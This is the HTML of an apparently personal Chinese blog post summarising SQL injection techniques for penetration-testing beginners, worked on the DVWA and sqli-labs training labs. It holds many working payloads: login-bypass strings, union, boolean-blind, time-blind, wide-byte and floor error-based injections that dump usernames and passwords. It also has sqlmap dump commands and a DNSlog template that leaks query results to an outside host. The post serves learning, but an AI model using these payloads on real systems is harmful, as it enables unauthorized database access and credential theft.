@@ -1,0 +1,1655 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>😍渗透基础总结 | xiaoguai</title>
+<link rel="shortcut icon" href="https://xiaoguai69.github.io/favicon.ico?v=1651985278787">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaoguai69.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="😍渗透基础总结 | xiaoguai - Atom Feed" href="https://xiaoguai69.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="一：sql注入
+什么是sql注入？？？
+就是指web应用程序在对用户输入的合法性没有进行严格判断或过滤不严格，导致攻击者可以额外添加sql语句，以此欺骗服务器达到执行非授权的任意查询的动作
+Ⅰ：数据库基础
+sql中的注释
+create da..." />
+    <meta name="keywords" content="渗透,安全" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaoguai69.github.io">
+  <img class="avatar" src="https://xiaoguai69.github.io/images/avatar.png?v=1651985278787" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaoguai
+  </h1>
+  <p class="site-description">
+    玛卡巴卡
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              😍渗透基础总结
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-05-08
+              </span>
+              <span>
+                44 min read
+              </span>
+              
+                <a href="https://xiaoguai69.github.io/tag/0GoWCZs8a/" class="post-tag">
+                  # 渗透
+                </a>
+              
+                <a href="https://xiaoguai69.github.io/tag/B7B6gwOGS2/" class="post-tag">
+                  # 安全
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="一sql注入">一：<strong>sql注入</strong></h1>
+<h5 id="什么是sql注入">什么是sql注入？？？</h5>
+<p><code>就是指web应用程序在对用户输入的合法性没有进行严格判断或过滤不严格，导致攻击者可以额外添加sql语句，以此欺骗服务器达到执行非授权的任意查询的动作</code></p>
+<h2 id="i数据库基础">Ⅰ：数据库基础</h2>
+<h4 id="sql中的注释">sql中的注释</h4>
+<pre><code class="language-sql">create database  123        --创建数据库123'     --是一个单行注释
+/**/               /*这是创建数据库，这个是一个多行注释*/
+#                  注释后边的
+</code></pre>
+<h4 id="sql中链接字符串的函数">sql中链接字符串的函数</h4>
+<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc">concat(),concat_ws()与及group_concat()的用法</a></p>
+<p><code>concat(str1,str2,…)</code>——没有分隔符地连接字符串</p>
+<p><code>concat_ws(separator,str1,str2,…)</code>——含有分隔符地连接字符串</p>
+<p><code>group_concat(str1,str2,…)</code>——连接一个组的所有字符串，知道这三个函数能一次性查出所有信息就行了。</p>
+<h3 id="1注入简介">①注入简介</h3>
+<ul>
+<li>回显正常---&gt; 联合查询 union select</li>
+<li>回显报错---&gt; Duplicate entry()<br>
+extractvalue()<br>
+　　       updatexml()</li>
+<li>盲注    ---&gt;布尔型盲注<br>
+基于时间的盲注sleep()</li>
+</ul>
+<h4 id="sql注入原理">sql注入原理</h4>
+<p>恶意的查询语句执行，是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，来得到数据库内的信息</p>
+<h4 id="根据sql数据分类">根据sql数据分类</h4>
+<h5 id="1-整形注入">1、整形注入</h5>
+<h5 id="2-字符型注入">2、字符型注入</h5>
+<h4 id="根据sql注入语法分类">根据sql注入语法分类</h4>
+<p>btuse，可以根据这五个字母进行划分</p>
+<h5 id="1-布尔注入boolean-based-blind-sql-injection">1、布尔注入（Boolean-based blind SQL injection）</h5>
+<p>不会返回结果，只能得到是或者否</p>
+<pre><code class="language-sql">#常用函数
+length(str)     #返回str字符串的长度。
+substr(str, pos, len)   #将str从pos位置开始截取len长度的字符进 行返回。注意这里的pos位置是从1开始的，不是数组的0开始
+mid(str,pos,len) #跟上面的一样，截取字符串
+ascii(str)     #返回字符串str的最左面字符的ASCII代码值。
+ord(str)         #同上，返回ascii码
+if(a,b,c)          #a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0
+limit       #返回a+1到a+b行的数据 
+
+#常用语句
+1.首先我们需要判断数据库长度 
+' or Length(database()) = 8 #返回true说明数据库长度为8
+2.获取数据库名字
+' or ord(mid(database(),1,1)) ='ascill值'#
+依次获取
+3.获取表的总数
+' or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#
+4.获取表的长度(第一个表)
+' or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1 )= (猜测得长度)#
+5.获取表的内容
+' or  mid((select TABLE_NAME from information_schema.TABLES where 
+TABLE_SCHEMA=database() limit 0,1),1,1)   = 'a' #
+6.获取表的字段的总数
+' or  (select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=表名 ) = 8#8返回true说明有8个表
+依次类推,最后推出内容。因为是盲猜所以只能这样一个一个去推手工比较麻烦 通常使用sqlmap进行注入
+
+</code></pre>
+<h5 id="2-时间注入time-based-blind-sql-injection">2、时间注入（Time-based blind SQL injection）</h5>
+<p>可以根据返回时间长短</p>
+<pre><code class="language-sql">在MYSQL中有一个函数：sleep（duration）,这个函数的意识是在duration参数给定的秒数之后运行语句，如下SQL语句：
+
+select  * from  users where id=1 and sleep(3);    /* 3秒之后执行SQL语句*/
+
+#常用参数
+sleep()/延迟函数
+if(condition,true,false)/若条件为真 返回true，若条件为假 返回false
+substring(&quot;string&quot;,strart,length)
+
+
+常用语句
+
+</code></pre>
+<h5 id="3-联合注入union-query-sql-injection">3、联合注入（Union query SQL injection）</h5>
+<p>过程：</p>
+<h5 id="4-多语句查询注入stacted-queries-sql-injection">4、多语句查询注入（Stacted queries SQL injection）</h5>
+<p>过程：</p>
+<h5 id="5-报错注入error-based-sql-injection">5、报错注入（Error-based SQL injection）</h5>
+<p>过程：</p>
+<h4 id="其他种类注入方式">其他种类注入方式</h4>
+<h5 id="盲注">盲注</h5>
+<h6 id="基于时间的盲注">基于时间的盲注</h6>
+<h3 id="发现注入点">发现注入点</h3>
+<h4 id="1-使用漏洞扫描工具">1、使用漏洞扫描工具</h4>
+<p>OWASP ZAP、D盾、seay</p>
+<p>万能密码</p>
+<pre><code class="language-sql">1' or 1=1 # 用户名和密码都可  
+' or '1'='1' -- 
+
+1' or '1'='1 密码才可
+</code></pre>
+<h4 id="2-使用谷歌hacking寻找">2、使用谷歌hacking寻找</h4>
+<p>hack语法：</p>
+<h2 id="ii尝试sql注入">Ⅱ：尝试sql注入</h2>
+<h3 id="1-手工注入思路">1、手工注入思路</h3>
+<p>1.判断是否存在注入，注入是字符型还是数字型<br>
+2.猜解 SQL 查询语句中的字段数<br>
+3.确定显示的字段顺序<br>
+4.获取当前数据库<br>
+5.获取数据库中的表<br>
+6.获取表中的字段名<br>
+7.显示字段信息</p>
+<figure data-type="image" tabindex="1"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/1.png" alt="img" loading="lazy"></figure>
+<h3 id="2-复现">2、复现</h3>
+<p>基于DVWA</p>
+<h4 id="1-首先-判断是否存在注入存在的注入点是字符型和数字型">1、首先 判断是否存在注入，存在的注入点是字符型和数字型</h4>
+<p><code>字符型和数字型最大区别: 数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的</code><br>
+<code>即：</code><br>
+<code>数字型：select * from table where id =$id</code><br>
+<code>字符型：select * from table where id =‘$id’</code></p>
+<p>判断是否为数字型</p>
+<pre><code class="language-sql">1 and 1 = 1     #永真
+
+1 and 1 = 2    #永假
+
+若不报错，则为数字型
+</code></pre>
+<p>判断是否为字符型</p>
+<pre><code class="language-sql">1' and ' 1' =' 1 
+1' and ' 1' =' 2
+1' or  ' 1' =' 2
+若页面正常，则为字符型
+</code></pre>
+<p>low源码</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '$id';
+</code></pre>
+<p>当我们输入 1 时，此sql语句即是</p>
+<pre><code class="language-sql">SELECT first_name, last_name FROM users WHERE user_id = '1'
+</code></pre>
+<p>我们进行判断是那种注入方式</p>
+<p>当测试到<code>1 'and '1' = '1</code>   时 报错，所以low级别为字符型注入</p>
+<h4 id="2猜解-sql-查询语句中的字段数">2.猜解 SQL 查询语句中的字段数</h4>
+<pre><code class="language-sql">1' or 1=1 order by 1 #    --查询成功  【order by x 对第几列进行排序】1'  order by 1 #  id=‘1‘  #’ 注释
+1' or 1=1 order by 2 #     --查询成功
+1' or 1=1 order by 3 #     --查询失败
+</code></pre>
+<p>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<p>（这里也可以通过输入union select 1,2,3...来猜解字段数）</p>
+<h4 id="3-确定显示字段的顺序">3、确定显示字段的顺序</h4>
+<pre><code class="language-sql">1' union select 1,2 #
+</code></pre>
+<p>UNION 操作符合并两个或多个 SELECT 语句的结果。</p>
+<p>select：select语句用于从数据库中选取数据：例如一个网站的参数传递执行的查询有3个字段，很可能这些字段不是都显示在网页前端的，假如其中的1或2个字段的查询结果是会返回到前端的，那么我们就需要知道这3个字段中哪两个结果会回显，这个过程相当于找到数据库与前端显示的通道。如果我们直接输入查询字段进行查询，语句会非常冗长，而且很可能还需要做很多次测试，这时候我们利用一个简单的select 1,2,3，根据显示在页面上的数字就可以知道哪个数字是这个“通道”，那么我们只需要把这个数字改成我们想查询的内容（如id,password），当数据爆破成功后，就会在窗口显示我们想要的结果。<a href="https://blog.csdn.net/weixin_44840696/article/details/89166154">SELECT 1,2,3…的含义及其在SQL注入中的用法</a></p>
+<h4 id="4-获取当前数据库">4、获取当前数据库</h4>
+<pre><code class="language-sql">1' union select 1,database()#
+#这样我们就会得到我们当前数据库：当然这个数字没啥含义
+1' union select database(),2#    --当我们这样输入得到的结果是一样的  
+</code></pre>
+<h4 id="5-获取数据库中的表">5、获取数据库中的表</h4>
+<pre><code class="language-sql">1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #      --这是一整个
+
+1' union select 1,table_name from information_schema.tables where table_schema='dvwa' #                   --两种方式都可以，下边符合我们房前环境，上边比较通用
+</code></pre>
+<p>此处用group_concat：可用concat函数替代，只是不集中在一起而已</p>
+<p>group_concat：可以把同一分组中的值链接在一起，</p>
+<p>此用了information_schema.tables当中存储了数据表的 元数据信息介绍：</p>
+<table>
+<thead>
+<tr>
+<th>字段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Table_catalog</td>
+<td>数据表登记目录</td>
+</tr>
+<tr>
+<td>Table_schema</td>
+<td>数据表所属的数据库名</td>
+</tr>
+<tr>
+<td>Table_name</td>
+<td>表名称</td>
+</tr>
+<tr>
+<td>Table_type</td>
+<td>表类型[system view|base table]</td>
+</tr>
+<tr>
+<td>Engine</td>
+<td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td>
+</tr>
+<tr>
+<td>Version</td>
+<td>版本，默认值10</td>
+</tr>
+<tr>
+<td>Row_format</td>
+<td>行格式[Compact|Dynamic|Fixed]</td>
+</tr>
+<tr>
+<td>Table_rows</td>
+<td>表里所存多少行数据</td>
+</tr>
+<tr>
+<td>Avg_row_length</td>
+<td>平均行长度</td>
+</tr>
+<tr>
+<td>Data_length</td>
+<td>数据长度</td>
+</tr>
+<tr>
+<td>Max_data_length</td>
+<td>最大数据长度</td>
+</tr>
+<tr>
+<td>Index_length</td>
+<td>索引长度</td>
+</tr>
+<tr>
+<td>Data_free</td>
+<td>空间碎片</td>
+</tr>
+<tr>
+<td>Auto_increment</td>
+<td>做自增主键的自动增量当前值</td>
+</tr>
+<tr>
+<td>Create_time</td>
+<td>表的创建时间</td>
+</tr>
+<tr>
+<td>Update_time</td>
+<td>表的更新时间</td>
+</tr>
+<tr>
+<td>Check_time</td>
+<td>表的检查时间</td>
+</tr>
+<tr>
+<td>Table_collation</td>
+<td>表的字符校验编码集</td>
+</tr>
+<tr>
+<td>Checksum</td>
+<td>校验和</td>
+</tr>
+<tr>
+<td>Create_options</td>
+<td>创建选项</td>
+</tr>
+<tr>
+<td>Table_comment</td>
+<td>表的注释、备注</td>
+</tr>
+</tbody>
+</table>
+<h4 id="6-获取当前表中字段名">6、获取当前表中字段名</h4>
+<pre><code class="language-sql">1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #
+1' union select 1,column_name from information_schema.columns where table_name='users' #
+</code></pre>
+<h4 id="7-下载数据获取字段信息">7、下载数据（获取字段信息）</h4>
+<pre><code class="language-sql">1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
+</code></pre>
+<h2 id="iii使用sqlmap注入待测试">Ⅲ：使用sqlmap注入（待测试）</h2>
+<p>sqlmap可以代替我们进行快速自动注入，sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测</p>
+<h3 id="1-sqlmap使用教程">1、sqlmap使用教程</h3>
+<h3 id="其他sql注入">其他sql注入</h3>
+<h4 id="1-sql盲注">1、sql盲注</h4>
+<p>​	盲注只会提示“是”或“不是”</p>
+<p><strong>手工盲注步骤</strong>：</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型<br>
+2.猜解当前数据库名<br>
+3.猜解数据库中的表名<br>
+4.猜解表中的字段名<br>
+5.猜解数据</p>
+<h6 id="手工盲注常用参数"><strong>手工盲注常用参数</strong></h6>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">函数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">left(字符串，截取长度)</td>
+<td style="text-align:left">从左边截取指定长度的字符串</td>
+</tr>
+<tr>
+<td style="text-align:left">length(字符串)</td>
+<td style="text-align:left">获取字符串的长度</td>
+</tr>
+<tr>
+<td style="text-align:left">limit</td>
+<td style="text-align:left">强制select语句返回的参数</td>
+</tr>
+<tr>
+<td style="text-align:left">ascii(字符串)</td>
+<td style="text-align:left">将指定字符串进行ascii编码</td>
+</tr>
+<tr>
+<td style="text-align:left">substr(字符串，start，截取长度)</td>
+<td style="text-align:left">截取字符串，可以指定起始位置和长度</td>
+</tr>
+<tr>
+<td style="text-align:left">mid(字符串，start，截取长度)</td>
+<td style="text-align:left">截取字符串，可以指定起始位置和长度</td>
+</tr>
+<tr>
+<td style="text-align:left">count()</td>
+<td style="text-align:left">计算总数，返回匹配条件的行数。</td>
+</tr>
+<tr>
+<td style="text-align:left">sleep(n)</td>
+<td style="text-align:left">将程序挂起n秒</td>
+</tr>
+<tr>
+<td style="text-align:left">if(参数1，参数2，参数3)</td>
+<td style="text-align:left">参数1为条件，当参数1返回的结果为true时，执行参数2，否则执行参数3</td>
+</tr>
+</tbody>
+</table>
+<h5 id="布尔盲注">布尔盲注</h5>
+<p>靶机：靶机：sqli-labs第5关</p>
+<p>页面没有显示，只能通过页面返回正常与不正常进行判断</p>
+<h6 id="手工注入实现">手工注入实现：</h6>
+<p>1查看页面变化，判断sql注入类型</p>
+<pre><code class="language-sql">?id=1 and 1=1
+?id=1 and 1=2
+【字符型】
+</code></pre>
+<p>2、猜数据库长度</p>
+<p>使用length（）判断数据库长度，采用二分法</p>
+<pre><code class="language-sql">?id=1' and length(database())&gt;5 --+
+?id=1' and length(database())&lt;10 --+
+?id=1' and length(database())=8 --+
+【length=8】
+</code></pre>
+<p>3、猜当前裤名</p>
+<p><strong>方法1：采用substr函数</strong></p>
+<pre><code class="language-sql">?id=1' and substr(database(),1,1)&gt;'r'--+ ?id=1' and substr(database(),1,1)&lt;'t'--+ ?id=1' and substr(database(),1,1)='s'--+ ?id=1' and substr(database(),2,1)='e'--+ ... ?id=1' and substr(database(),8,1)='y'--+ 
+--【security】
+</code></pre>
+<p><strong>方法2：使用<code>ascii函数和substr函数</code></strong></p>
+<pre><code class="language-sql">?id=1' and ascii(substr(database(),1,1))&gt;114 --+ ?id=1' and ascii(substr(database(),1,1))&lt;116 --+ ?id=1' and ascii(substr(database(),1,1))=115 --+ 
+--【security】
+</code></pre>
+<p><strong>方法3：使用left函数</strong></p>
+<pre><code class="language-sql">?id=1' and left(database(),1)&gt;'r'--+ ?id=1' and left(database(),1)&lt;'t'--+ ?id=1' and left(database(),1)='s' --+ ?id=1' and left(database(),2)='se' --+ ?id=1' and left(database(),3)='sec' --+ ... ?id=1' and left(database(),8)='security' --+ 
+--【security】
+
+</code></pre>
+<p><strong>方法四：使用burp</strong></p>
+<figure data-type="image" tabindex="2"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5Cburp-sql.jpg" alt="4" loading="lazy"></figure>
+<p>4.判断表个数</p>
+<p>count()函数是用来统计表中记录的一个函数，返回匹配条件的行数。</p>
+<pre><code class="language-sql">?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;0 --+ 
+?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ 
+--【4个表】
+</code></pre>
+<p>5、判断表的长度</p>
+<p>limit可以被用于强制select语句返回指定的条数。</p>
+<p>length：获取数据串的长度</p>
+<pre><code class="language-sql">?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+ 
+--【第一个表长度为6】 
+?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=8 --+ 
+--【第二个表长度为8】
+</code></pre>
+<p>6、猜表名</p>
+<p>用substr函数：截取字符串，可以指定起始位置和长度</p>
+<pre><code class="language-sql">?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;'d' --+ 
+?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;'f' --+ 
+?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+ 
+
+?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1)='s' --+ 
+
+--【第一个表名为emails】
+--可以用burp进行跑，类似上方
+</code></pre>
+<p>7、猜解字段名和字段信息</p>
+<pre><code class="language-sql">#确定字段个数 
+?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')&gt;0 --+ 
+?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name = 'users')=3 --+ 
+【字段个数为3】 
+
+#确定字段名的长度 
+?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))&gt;0 --+ 
+?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1))=2 --+
+?id=1' and length((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 1,1))=8 --+ 
+--【第一个字段长度为2，第二个字段长度为8】 
+
+#猜字段名 同上使用burp 
+?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name = 'users' limit 0,1),1,1)='i' --+ 
+--【...id,username,password...】 
+
+#确定字段数据长度 
+?id=1' and length((select username from users limit 0,1))=4 --+ 
+--【第一个字段数据长度为4】 #猜解字段数据 同上使用burp 
+
+?id=1' and substr((select username from users limit 0,1),1,1)='d' --+ ?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;79 --+ 
+--【第一个username数据为dumb】
+
+</code></pre>
+<h6 id="sqlmap实现布尔注入">sqlmap实现布尔注入</h6>
+<p>用到参数</p>
+<pre><code>--batch: 用此参数，不需要用户输入，将会使用sqlmap提示的默认值一直运行下去。
+--technique:选择注入技术，B:Boolean-based-blind  （布尔型盲注）
+--threads 10 :设置线程为10，运行速度会更快
+</code></pre>
+<pre><code class="language-python">#查询数据库 #【security】 
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B --dbs --batch --threads 10 
+        
+#获取数据库中的表 #【emails、referers、uagents、users】 
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security --tables --batch --threads 10 
+
+#获取表中的字段名 #【id、username、password】 
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users --columns --batch --threads 10 
+        
+#获取字段信息 #【Dumb|Dumb、dhakkan|dumbo ...】
+python sqlmap.py -u http://139.224.112.182:8087/sqli1/Less-5/?id=1 --technique B -D security -T users -C username,password --dump --batch --threads 10
+</code></pre>
+<h5 id="时间盲注">时间盲注</h5>
+<ul>
+<li>页面上没有显示位</li>
+<li>没有输出报错语句</li>
+<li>正确的sql语句和错误的sql语句页面返回一致</li>
+</ul>
+<h6 id="手工实现">手工实现：</h6>
+<pre><code class="language-sql">?id=1 
+?id=1' 
+?id=1&quot; 
+#不管怎么样都不报错，不管对错一直显示一个固定的页面； 
+
+#判断注入点 
+?id=1' and sleep(3)--+ 
+#页面响应延迟，判断存在时间延迟型注入 
+
+#获取数据库名长度 
+?id=1' and if(length(database())=8,sleep(3),1)--+ 
+
+#获取数据库名 
+?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+
+</code></pre>
+<p>sqlmap实现</p>
+<pre><code class="language-python">#查询数据库 #【security】 
+sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T --dbs --batch --threads 10 
+
+#获取数据库中的表 #【emails、referers、uagents、users】 
+sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security --tables --batch --threads 10 
+       
+#获取表中的字段名 #【id、username、password】 
+sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security -T users --columns --batch --threads 10 
+        
+#获取字段信息 【Dumb|Dumb、dhakkan|dumbo ...】 
+sqlmap -u http://192.168.200.120/sql/Less-9/?id=1  --technique T -D security -T users -C username,password --dump --batch --threads 10
+</code></pre>
+<h4 id="2-dnslog注入有待学习">2、DNSlog注入（有待学习）</h4>
+<p>https://www.cnblogs.com/Xy--1/p/12896599.html</p>
+<h5 id="基础知识">基础知识</h5>
+<p><strong>什么是DNS</strong></p>
+<p>DNS的全称是 <code>Domain Name System</code>（域名系统），它将域名解析为 IP，使人更方便地访问互联网。当用户输入某一网址如<code>www.baidu.com</code>，网络上的 DNS 服务器会将该域名解析，并找到对应的真实IP：<code>182.61.200.6</code>，使用户可以访问这台服务器上相应的服务。</p>
+<p><strong>什么是DNSlog</strong></p>
+<p>DNSlog 就是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。SQL 盲注、命令执行、SSRF 及 XSS 等攻击而无法看到回显结果时，就会用到 DNSlog 技术。</p>
+<p><strong>为什么用Dnslog盲注</strong></p>
+<p>对于SQL盲注，我们可以通过布尔或者时间盲注获取内容，但是整个过程效率低，需要发送很多的请求进行判断，容易触发安全设备的防护，最后导致 IP 被 ban，Dnslog 盲注可以减少发送的请求，直接回显数据实现注入。</p>
+<h5 id="原理">原理</h5>
+<p>攻击语句：</p>
+<pre><code class="language-sql">select load_file(concat('\\\\',攻击语句,'.XXX.ceye.io\\abc'))
+</code></pre>
+<h4 id="3-宽字节注入">3、宽字节注入</h4>
+<p><strong>原理</strong>：宽字节注入是利用mysql的一个特性，<code>mysql在使用GBK编码的时候，会认为两个字符是一个汉字</code>【前一个ascii码要大于<code>128</code>，才到汉字的范围】</p>
+<p>简单的URL编码</p>
+<table>
+<thead>
+<tr>
+<th>空格</th>
+<th>%20</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>'（单引号）</td>
+<td>%27</td>
+</tr>
+<tr>
+<td>#</td>
+<td>%23</td>
+</tr>
+<tr>
+<td>\（反斜杠）</td>
+<td>%5C</td>
+</tr>
+<tr>
+<td></td>
+<td>%df</td>
+</tr>
+</tbody>
+</table>
+<p>当输入单引号，假设这里我们使用<code>addslashes</code>转义，对应的url编码是：<br>
+<strong><code>'</code> –&gt;<code>\'</code>–&gt; <code>%5c%27</code></strong><br>
+当在前面引入一个ASCII大于128的字符【比如%df、%aa】，url编码变为：<br>
+<strong><code>%df'</code> –&gt; <code>%df\'</code> –&gt; <code>(%df%5C)%27</code>–&gt;<code>(数据库GBK)</code>–&gt;<code>運'</code></strong></p>
+<p>前端输入**<code>%df'</code><strong>时首先经过上面</strong><code>addslashes</code><strong>函数和浏览器</strong><code>url编码</code><strong>转义变成了</strong><code>%df%5c%27</code>**  ，单引号 ' = %27成功逃脱，利用这个特性从而可实施SQL注入的利用。</p>
+<h5 id="手工测试">手工测试：</h5>
+<p>测试环境：sql-less-33</p>
+<pre><code class="language-sql">1、测试
+?id=1
+'''
+Welcome    Dhakkan
+Your Login name:Dumb
+Your Password:Dumb
+'''
+?id=1'
+'''Hint: The Query String you input is escaped as : 1 \'
+The Query String you input in Hex becomes : 31205c27
+'''
+--当输入 ' 被编成了\ 所以推测应该是函数转义：addslashes函数
+
+?id=1%df'
+'''
+或者【只要ASCII大于128的字符就可以】
+?id=1%aa'
+此时会报错
+'''
+
+2、确定字段
+?id=1%df' order by 4 --+          
+'''
+输入3 正常，but4不正常了，所以判断字段数为3
+'''
+
+3、确定显示位
+?id=-1%aa' union select 1,2,3--+
+'''
+Welcome    Dhakkan
+Your Login name:2
+Your Password:3
+'''
+--确定了回显位置是 2  3
+
+4、查询信息
+#查询数据库
+?id=-1%aa' union select 1,2,database() --+
+'''
+Welcome    Dhakkan
+Your Login name:2
+Your Password:security
+'''
+--得到数据库是security
+
+#查询表名
+?id=-1%aa' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()  --+
+'''
+Welcome    Dhakkan
+Your Login name:2
+Your Password:emails,referers,uagents,users
+'''
+
+#查询字段名
+?id=-1%aa' union select 1, 2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273  --+
+'''
+Welcome    Dhakkan
+Your Login name:2
+Your Password:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password,level,id,username,password
+'''
+--这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
+
+#查询字段信息
+---待更新
+?id=-1%aa' union select 1,group_concat(username),group_concat(password) from users  --+
+'''
+Welcome    Dhakkan
+Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 
+'''
+
+</code></pre>
+<p><strong>待更新</strong></p>
+<h5 id="使用sqlmap">使用sqlmap：</h5>
+<h4 id="4-报错注入需要补充">4、报错注入（需要补充）</h4>
+<h5 id="floor报错注入双查询注入">floor报错注入/双查询注入</h5>
+<p>双查询报错/floor报错注入是由于<code>rand()</code>，<code>count()</code>，<code>group by</code> ，<code>floor</code>四个语句联合使用造成的，缺一不可。</p>
+<p>一些研究人员发现，使用<code>group by</code>子句结合<code>rand()</code>函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询/floor报错注入。使用<code>floor()</code>函数只是为了将查询结果分类</p>
+<p>需用到四个函数和一个<code>group by</code>语句：</p>
+<ol>
+<li><code>group by ...</code> —&gt;分组语句 //将查询的结果分类汇总</li>
+<li><code>rand()</code> —&gt;在0-1之间随机数生成函数</li>
+<li><code>floor()</code> —&gt;取整函数 //用来对生成的随机数取整</li>
+<li><code>concat()</code>、 <code>concat_ws()</code>—&gt;连接字符串</li>
+<li><code>count()</code> —&gt;统计函数 //结合group by语句统计分组后的数据</li>
+</ol>
+<p>子查询：内部查询、简单理解，select中嵌套一个select查询</p>
+<pre><code class="language-sql">select concat(&quot;-&quot;,(select database()));
+</code></pre>
+<p><strong>floor报错注入：</strong></p>
+<pre><code class="language-sql">?id=-1' union select 1,count(*), concat((select database()), floor(rand(1)*2))as a from information_schema.tables group by a --+
+</code></pre>
+<p>因为rand的随机性：所以我们每次不一定都可以看到正常页面，当我们加上1之后，就i可以了</p>
+<p><strong>双查询注入</strong></p>
+<p>当group by 在查询虚拟表和插入虚拟表时，如果这两次a语句执行的结果不一致就会引发错误，错误提示信息是插入的主键重复，通过自定义提示里报错信息中的主键值来获得敏感信息。</p>
+<p><strong>payloads</strong></p>
+<pre><code class="language-sql">#获取数据库名 
+?id=-1' union select 1,count(*),concat_ws('-',(select database()),floor(rand(0)*2))as a from information_schema.tables group by a--+ 
+或者 
+?id=1' and (select 1 from (select count(*),concat('~',database(),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+ 
+
+#获取表名 
+?id=-1' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2))as a from information_schema.tables group by a--+ 
+或者 
+?id=1'and (select 1 from (select count(*),concat('~',(select table_name from information_schema.tables where table_schema = database() limit 0,1),'~',floor(rand(0)*2))as x from information_schema.tables group by x)a) --+
+
+</code></pre>
+<h5 id="updatexml报错注入">updatexml报错注入</h5>
